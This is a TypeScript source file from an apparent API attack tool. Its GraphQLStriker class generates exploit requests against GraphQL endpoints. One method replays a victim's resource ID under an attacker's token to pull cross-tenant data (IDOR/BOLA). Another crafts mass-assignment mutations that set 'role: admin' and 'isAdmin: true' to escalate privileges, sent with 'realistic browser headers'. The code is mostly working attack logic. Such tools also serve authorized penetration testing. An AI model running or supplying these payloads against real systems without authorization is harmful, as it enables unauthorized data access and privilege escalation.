import { ExploitCandidate, DualSessionContext } from '../types.js';
import { GraphQLField } from '../scout/graphql_parser.js';
import { REALISTIC_BROWSER_HEADERS, buildSessionHeaders } from './idor_striker.js';

export interface GraphQLStrikerOptions {
  selectionSet?: string; // Fields to select, e.g. "{ id secret confidential amount status }"
}

/**
 * GRAPHQL DUAL-SESSION STRIKER (OWASP API1 & API3 on GraphQL)
 * Generates GraphQL query and mutation tampering payloads to prove cross-tenant isolation failure.
 */
export class GraphQLStriker {
  private static readonly DEFAULT_SELECTION_SET = '{ id secret data confidential amount status owner }';

  /**
   * Generates dual-session BOLA/IDOR candidates for GraphQL queries with ID arguments.
   */
  public static generateQueryCandidates(
    field: GraphQLField,
    graphqlUrl: string,
    context: DualSessionContext,
    options: GraphQLStrikerOptions = {}
  ): ExploitCandidate[] {
    const idArg = field.args.find(a => /^(id|_id|uuid|[a-zA-Z0-9_]+Id)$/i.test(a.name)) || field.args[0];
    if (!idArg) {
      return [];
    }

    const selectionSet = options.selectionSet || this.DEFAULT_SELECTION_SET;
    const queryName = field.name;
    const varName = idArg.name;
    const varType = idArg.typeName === 'ID' ? 'ID!' : `${idArg.typeName || 'String'}!`;

    // Parameterized GraphQL query
    const queryString = `query GetTarget($${varName}: ${varType}) { ${queryName}(${varName}: $${varName}) ${selectionSet} }`;

    const victimVariables = { [varName]: context.victimResourceId };
    const attackerVariables = { [varName]: context.victimResourceId }; // Attacker requesting victim resource ID

    const baselineBody = JSON.stringify({
      query: queryString,
      variables: victimVariables,
    });

    const probeBody = JSON.stringify({
      query: queryString,
      variables: attackerVariables,
    });

    const headers = buildSessionHeaders(context.attackerToken, context.attackerHeaders, {
      'Content-Type': 'application/json',
    });

    const baselineHeaders = buildSessionHeaders(context.victimToken, context.victimHeaders, {
      'Content-Type': 'application/json',
    });

    return [
      {
        vector: 'IDOR_READ_VIOLATION',
        targetUrl: graphqlUrl,
        method: 'POST',
        headers,
        body: probeBody,
        baselineHeaders,
        baselineBody,
        expectedLeakFragment: context.victimSecretIdentifier,
      },
    ];
  }

  /**
   * Generates Mass Assignment mutation candidates for GraphQL.
   */
  public static generateMutationCandidates(
    field: GraphQLField,
    graphqlUrl: string,
    authToken: string,
    targetResourceId: string
  ): ExploitCandidate[] {
    const mutationName = field.name;
    const queryString = `mutation UpdateTarget($input: JSON) { ${mutationName}(input: $input) { status role isAdmin } }`;

    const probeBody = JSON.stringify({
      query: queryString,
      variables: {
        input: {
          id: targetResourceId,
          role: 'admin',
          isAdmin: true,
        },
      },
    });

    return [
      {
        vector: 'MASS_ASSIGNMENT_VIOLATION',
        targetUrl: graphqlUrl,
        method: 'POST',
        headers: {
          ...REALISTIC_BROWSER_HEADERS,
          'Authorization': `Bearer ${authToken}`,
          'Content-Type': 'application/json',
        },
        body: probeBody,
        expectedLeakFragment: '"role":"admin"',
      },
    ];
  }
}
